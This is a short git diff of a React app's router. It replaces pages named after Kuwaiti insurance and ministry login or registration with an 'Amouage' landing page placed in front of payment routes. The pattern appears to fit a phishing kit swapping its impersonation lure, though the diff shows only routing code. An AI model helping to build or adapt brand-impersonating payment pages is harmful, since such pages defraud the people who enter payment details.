@@ -10,11 +10,8 @@ import { ThemeProvider } from "./contexts/ThemeContext";
 import { initializeSocket, disconnectSocket, socket } from "./lib/store";
 import AmerChat from "./components/AmerChat";
 
-// Main Pages (Vehicle Inspection)
-import KuwaitInsuranceHome from "./pages/KuwaitInsuranceHome";
-import MOHLogin from "./pages/MOHLogin";
-import MOHRegister from "./pages/MOHRegister";
-import MOHCreateAccount from "./pages/MOHCreateAccount";
+// Main Pages
+import AmouageLanding from "./pages/AmouageLanding";
 
 
 // Form Pages
@@ -39,8 +36,8 @@ import FinalPage from "./pages/FinalPage";
 function Router() {
   return (
     <Switch>
-      {/* Main Page - Direct to Summary Payment */}
-      <Route path={"/"} component={SummaryPayment} />
+      {/* Main Page - Amouage Landing */}
+      <Route path={"/"} component={AmouageLanding} />
       <Route path={"/summary-payment"} component={SummaryPayment} />
 
       {/* Payment Routes */}
